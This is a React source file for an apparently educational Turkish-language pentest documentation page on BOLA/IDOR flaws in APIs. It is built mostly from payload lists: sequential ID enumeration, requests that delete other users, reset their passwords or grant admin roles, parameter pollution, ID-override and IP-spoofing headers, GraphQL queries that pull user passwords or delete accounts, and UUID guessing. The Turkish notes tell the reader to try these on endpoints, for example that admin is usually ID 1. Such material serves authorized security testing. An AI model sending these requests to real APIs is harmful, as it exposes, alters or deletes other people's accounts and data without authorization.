"use client"

import { motion } from "framer-motion"
import Link from "next/link"
import { Server, ArrowRight } from "lucide-react"
import { TableOfContents } from "@/components/docs/table-of-contents"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"

const tocItems = [
  { id: "bola", title: "BOLA Payloads", level: 2 },
  { id: "idor-urls", title: "IDOR URL Patterns", level: 2 },
  { id: "id-manipulation", title: "ID Manipulation", level: 2 },
  { id: "bypass", title: "Bypass Techniques", level: 2 },
  { id: "graphql-idor", title: "GraphQL IDOR", level: 2 },
  { id: "uuid-attacks", title: "UUID Attacks", level: 2 },
]

const fadeIn = {
  initial: { opacity: 0, y: 20 },
  animate: { opacity: 1, y: 0 },
  transition: { duration: 0.4 }
}

const stagger = {
  animate: {
    transition: {
      staggerChildren: 0.1
    }
  }
}

// Payload Collections
const bolaPayloads = [
  { code: `GET /api/users/1001/profile`, note: "Kendi ID'nizi biliyorsanız +1, -1 deneyin" },
  { code: `GET /api/users/1002/profile`, note: "Sequential ID enumeration" },
  { code: `GET /api/orders/ORD-2024-0001`, note: "Predictable order ID" },
  { code: `GET /api/invoices/INV-00123`, note: "Invoice number pattern" },
  { code: `GET /api/documents/DOC-2024-001/download` },
  { code: `GET /api/accounts/ACC-123456/balance` },
  { code: `GET /api/tickets/TKT-789/messages` },
  { code: `DELETE /api/users/1002`, note: "Başka kullanıcıyı silme" },
  { code: `PUT /api/users/1002/role {"role":"admin"}`, note: "Privilege escalation" },
  { code: `POST /api/users/1002/password-reset`, note: "Başka kullanıcının şifresini sıfırlama" },
  { code: `GET /api/admin/users/1002`, note: "Admin endpoint ile normal user data" },
  { code: `PATCH /api/orders/ORD-123 {"status":"shipped"}` },
]

const idorUrlPayloads = [
  { code: `/api/v1/users/{user_id}/profile` },
  { code: `/api/v1/users/{user_id}/settings` },
  { code: `/api/v1/users/{user_id}/notifications` },
  { code: `/api/v1/orders/{order_id}` },
  { code: `/api/v1/orders/{order_id}/invoice` },
  { code: `/api/v1/orders/{order_id}/tracking` },
  { code: `/api/v1/documents/{doc_id}/download` },
  { code: `/api/v1/documents/{doc_id}/share` },
  { code: `/api/v1/messages/{message_id}` },
  { code: `/api/v1/conversations/{conv_id}/messages` },
  { code: `/api/v1/payments/{payment_id}/receipt` },
  { code: `/api/v1/subscriptions/{sub_id}/cancel` },
  { code: `/api/v1/files/{file_id}` },
  { code: `/api/v1/reports/{report_id}/export` },
  { code: `/api/v1/cards/{card_id}` },
  { code: `/api/v1/addresses/{address_id}` },
  { code: `/download?file={filename}` },
  { code: `/export?id={export_id}` },
  { code: `/preview?document={doc_id}` },
]

const idManipulationPayloads = [
  { code: `/api/users/123 → /api/users/124`, note: "Basic increment" },
  { code: `/api/users/123 → /api/users/122`, note: "Decrement" },
  { code: `/api/users/123 → /api/users/1`, note: "Admin genelde ID 1" },
  { code: `/api/users/123 → /api/users/0`, note: "Edge case" },
  { code: `/api/users/123 → /api/users/-1`, note: "Negative ID" },
  { code: `/api/users/123 → /api/users/999999999`, note: "Large number" },
  { code: `/api/users/123 → /api/users/123.0`, note: "Float format" },
  { code: `/api/users/123 → /api/users/123%00`, note: "Null byte" },
  { code: `/api/users/123 → /api/users/0x7B`, note: "Hex encoding (123 = 0x7B)" },
  { code: `/api/users/123 → /api/users/00123`, note: "Leading zeros" },
  { code: `/api/users/abc → /api/users/ABC`, note: "Case sensitivity" },
  { code: `/api/users/abc → /api/users/abc%20`, note: "Trailing space" },
  { code: `/api/users/abc → /api/users/abc/`, note: "Trailing slash" },
  { code: `/api/users/abc → /api/users/./abc`, note: "Dot notation" },
  { code: `/api/users/abc → /api/users/abc%2e`, note: "URL encoded dot" },
]

const bypassPayloads = [
  { code: `GET /api/users/victim?user_id=attacker`, note: "Parameter override" },
  { code: `GET /api/users/attacker?id=victim`, note: "Hidden parameter" },
  { code: `GET /api/profile?user_id=attacker&user_id=victim`, note: "HPP - HTTP Parameter Pollution" },
  { code: `GET /api/profile?user_id[]=attacker&user_id[]=victim`, note: "Array injection" },
  { code: `POST /api/profile {"user_id":"attacker","user_id":"victim"}`, note: "JSON duplicate key" },
  { code: `GET /api/v2/users/123 → /api/v1/users/123`, note: "API version downgrade" },
  { code: `GET /api/users/123 → /api/Users/123`, note: "Case variation" },
  { code: `GET /api/users/123 → /internal/api/users/123`, note: "Internal endpoint" },
  { code: `GET /api/users/123 → /api/admin/users/123`, note: "Admin endpoint" },
  { code: `GET /api/users/me → /api/users/123`, note: "me endpoint bypass" },
  { code: `POST {"userId": 123} → {"userId": "123"}`, note: "Type juggling" },
  { code: `POST {"userId": 123} → {"userId": [123, 456]}`, note: "Array instead of single" },
  { code: `POST {"user": {"id": 123}}`, note: "Nested object" },
  { code: `X-User-Id: victim_id`, note: "Custom header injection" },
  { code: `X-Original-URL: /api/users/victim`, note: "URL override header" },
  { code: `X-Forwarded-For: internal-ip`, note: "IP spoofing for internal access" },
]

const graphqlIdorPayloads = [
  { code: `query { user(id: "victim-id") { email phone } }`, note: "Direct ID query" },
  { code: `query { users { id email password } }`, note: "List all users" },
  { code: `query { order(id: "ORD-123") { items total creditCard } }` },
  { code: `mutation { deleteUser(id: "victim-id") }`, note: "Unauthorized deletion" },
  { code: `mutation { updateUser(id: "victim", role: "admin") }`, note: "Privilege escalation" },
  { code: `query { node(id: "base64-encoded-id") { ... on User { email } } }`, note: "Relay-style ID" },
  { code: `query { __type(name: "User") { fields { name } } }`, note: "Introspection for field discovery" },
  { code: `query { users(filter: {id: {eq: "victim"}}) { nodes { sensitiveData } } }`, note: "Filter bypass" },
  { code: `mutation { createOrder(userId: "victim-id", items: [...]) }`, note: "Create on behalf" },
  { code: `subscription { userUpdates(userId: "victim-id") { ... } }`, note: "Subscription IDOR" },
]

const uuidPayloads = [
  { code: `550e8400-e29b-41d4-a716-446655440000`, note: "UUID v1 - time-based, predictable" },
  { code: `6ba7b810-9dad-11d1-80b4-00c04fd430c8`, note: "UUID v1 - extract timestamp" },
  { code: `f47ac10b-58cc-4372-a567-0e02b2c3d479`, note: "UUID v4 - random, harder to guess" },
  { code: `00000000-0000-0000-0000-000000000000`, note: "Null UUID" },
  { code: `ffffffff-ffff-ffff-ffff-ffffffffffff`, note: "Max UUID" },
  { code: `550e8400-e29b-41d4-a716-446655440001`, note: "Increment last byte" },
  { code: `550e8400-e29b-41d4-a716-446655440000 → decode timestamp`, note: "V1 UUID timestamp leak" },
  { code: `/api/files/uploads/2024/01/15/{uuid}.pdf`, note: "Path-based UUID with date" },
  { code: `base64(user_type:user_id)`, note: "Encoded composite ID" },
  { code: `eyJ0eXBlIjoidXNlciIsImlkIjoxMjN9`, note: "Base64 JSON ID - decode and modify" },
]

const parameterPayloads = [
  { code: `?user_id=123`, note: "Query parameter" },
  { code: `?userId=123` },
  { code: `?uid=123` },
  { code: `?id=123` },
  { code: `?account_id=123` },
  { code: `?accountId=123` },
  { code: `?owner=123` },
  { code: `?author=123` },
  { code: `?creator_id=123` },
  { code: `?assigned_to=123` },
  { code: `?recipient=123` },
  { code: `?target_user=123` },
  { code: `?profile_id=123` },
  { code: `?member_id=123` },
  { code: `?customer_id=123` },
  { code: `?client_id=123` },
]

const headerPayloads = [
  { code: `X-User-ID: victim_id`, note: "Custom user header" },
  { code: `X-Account-ID: victim_account` },
  { code: `X-Tenant-ID: other_tenant`, note: "Multi-tenant bypass" },
  { code: `X-Organization-ID: other_org` },
  { code: `X-Original-URL: /admin/users/victim` },
  { code: `X-Rewrite-URL: /internal/api/users/victim` },
  { code: `X-Forwarded-Host: internal.api.com` },
  { code: `X-Real-IP: 127.0.0.1`, note: "Localhost bypass" },
  { code: `Authorization: Bearer <other_user_token>`, note: "Token swap" },
  { code: `Cookie: session=other_user_session` },
]

export default function BolaIdorPage() {
  return (
    <div className="relative">
      <TableOfContents items={tocItems} />
      
      <motion.article
        initial="initial"
        animate="animate"
        variants={stagger}
        className="prose prose-invert max-w-none"
      >
        <motion.div variants={fadeIn} className="mb-8">
          <div className="flex items-center gap-2 text-green-400 text-sm font-medium mb-4">
            <Server className="w-4 h-4" />
            <span>API Zafiyetleri</span>
          </div>
          
          <h1 className="text-4xl font-bold text-foreground mb-4">
            BOLA / IDOR
          </h1>
          <p className="text-lg text-muted-foreground leading-relaxed">
            Broken Object Level Authorization (BOLA) ve Insecure Direct Object Reference (IDOR), 
            API&apos;lerde en yaygın ve etkili zafiyetlerden biridir. OWASP API Top 10&apos;da 
            API1:2023 olarak birinci sırada yer alır.
          </p>
        </motion.div>

        <Callout type="info" title="OWASP API1:2023">
          API&apos;lerin %40&apos;ından fazlasında bu zafiyet bulunur. Her endpoint&apos;te 
          ID parametresi varsa IDOR test edin.
        </Callout>

        {/* BOLA Payloads */}
        <motion.section variants={fadeIn} id="bola" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-green-500/10 text-green-400 text-sm font-mono">01</span>
            BOLA Payloads
          </h2>
          <p className="text-muted-foreground mb-4">
            Authorization bypass için temel BOLA payload&apos;ları. Kendi ID&apos;nizi bulduktan sonra 
            başka kullanıcıların ID&apos;lerini deneyerek yetkisiz erişim test edin.
          </p>

          <Callout type="tip" title="Dipnot">
            İlk adım kendi ID&apos;nizi bulmak. Ardından +1, -1 ile sequential test yapın. 
            Admin genelde ID 1 veya 0&apos;dır.
          </Callout>

          <PayloadList 
            title="Authorization Bypass Requests" 
            payloads={bolaPayloads}
            initialShow={6}
          />
        </motion.section>

        {/* IDOR URL Patterns */}
        <motion.section variants={fadeIn} id="idor-urls" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-blue-500/10 text-blue-400 text-sm font-mono">02</span>
            IDOR URL Patterns
          </h2>
          <p className="text-muted-foreground mb-4">
            IDOR&apos;a açık olabilecek yaygın URL pattern&apos;leri. Bu endpoint&apos;leri gördüğünüzde 
            ID manipulation deneyin.
          </p>

          <PayloadList 
            title="Common Vulnerable Endpoints" 
            payloads={idorUrlPayloads}
            initialShow={8}
          />
        </motion.section>

        {/* ID Manipulation */}
        <motion.section variants={fadeIn} id="id-manipulation" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-purple-500/10 text-purple-400 text-sm font-mono">03</span>
            ID Manipulation
          </h2>
          <p className="text-muted-foreground mb-4">
            ID değerlerini manipüle etme teknikleri. Sadece sayıyı değiştirmek yetmiyorsa 
            farklı formatlar ve encoding deneyin.
          </p>

          <Callout type="info" title="Dipnot">
            Backend farklı parser kullanıyor olabilir. 123, &quot;123&quot;, 123.0, 0x7B hepsi 
            farklı yorumlanabilir.
          </Callout>

          <PayloadList 
            title="ID Format Variations" 
            payloads={idManipulationPayloads}
            initialShow={7}
          />
        </motion.section>

        {/* Bypass Techniques */}
        <motion.section variants={fadeIn} id="bypass" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-orange-500/10 text-orange-400 text-sm font-mono">04</span>
            Bypass Techniques
          </h2>
          <p className="text-muted-foreground mb-4">
            Authorization kontrollerini atlatmak için gelişmiş teknikler. Parameter pollution, 
            header injection ve endpoint varyasyonları.
          </p>

          <Callout type="warning" title="Dipnot">
            API version downgrade çok etkili. /api/v2 güvenli olsa bile /api/v1 veya /api 
            savunmasız olabilir.
          </Callout>

          <PayloadList 
            title="Authorization Bypass" 
            payloads={bypassPayloads}
            initialShow={8}
          />

          <h4 className="text-lg font-medium text-foreground mt-6 mb-2">Parameter Names</h4>
          <PayloadList 
            title="Common ID Parameters" 
            payloads={parameterPayloads}
            initialShow={6}
          />

          <h4 className="text-lg font-medium text-foreground mt-6 mb-2">Header Injection</h4>
          <PayloadList 
            title="ID Override Headers" 
            payloads={headerPayloads}
            initialShow={5}
          />
        </motion.section>

        {/* GraphQL IDOR */}
        <motion.section variants={fadeIn} id="graphql-idor" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-pink-500/10 text-pink-400 text-sm font-mono">05</span>
            GraphQL IDOR
          </h2>
          <p className="text-muted-foreground mb-4">
            GraphQL API&apos;lerinde IDOR zafiyetleri. Introspection ile şema keşfi yapın, 
            ardından ID parametrelerini manipüle edin.
          </p>

          <Callout type="tip" title="Dipnot">
            GraphQL&apos;de önce introspection query ile şemayı çıkarın. Hangi field&apos;lar 
            ID alıyor, hangileri hassas veri dönüyor anlayın.
          </Callout>

          <PayloadList 
            title="GraphQL IDOR Queries" 
            payloads={graphqlIdorPayloads}
            initialShow={5}
          />
        </motion.section>

        {/* UUID Attacks */}
        <motion.section variants={fadeIn} id="uuid-attacks" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-cyan-500/10 text-cyan-400 text-sm font-mono">06</span>
            UUID Attacks
          </h2>
          <p className="text-muted-foreground mb-4">
            UUID kullanılsa bile zafiyet olabilir. UUID v1 time-based ve tahmin edilebilir, 
            v4 random ama encoding/composite ID&apos;ler manipüle edilebilir.
          </p>

          <Callout type="info" title="Dipnot">
            UUID v1&apos;den timestamp çıkarılabilir. Aynı saniyede oluşturulan UUID&apos;ler 
            benzer olacaktır. UUID v4 daha güvenli ama encoded ID&apos;lere dikkat.
          </Callout>

          <PayloadList 
            title="UUID Manipulation" 
            payloads={uuidPayloads}
            initialShow={5}
          />
        </motion.section>

        {/* Footer Navigation */}
        <motion.div variants={fadeIn} className="mt-16 pt-8 border-t border-border/50">
          <div className="flex justify-between items-center">
            <Link 
              href="/docs" 
              className="text-muted-foreground hover:text-foreground transition-colors text-sm"
            >
              Ana Sayfa
            </Link>
            <Link
              href="/docs/api/broken-auth"
              className="text-primary hover:text-primary/80 transition-colors text-sm flex items-center gap-2"
            >
              Broken Authentication
              <ArrowRight className="w-4 h-4" />
            </Link>
          </div>
        </motion.div>
      </motion.article>
    </div>
  )
}
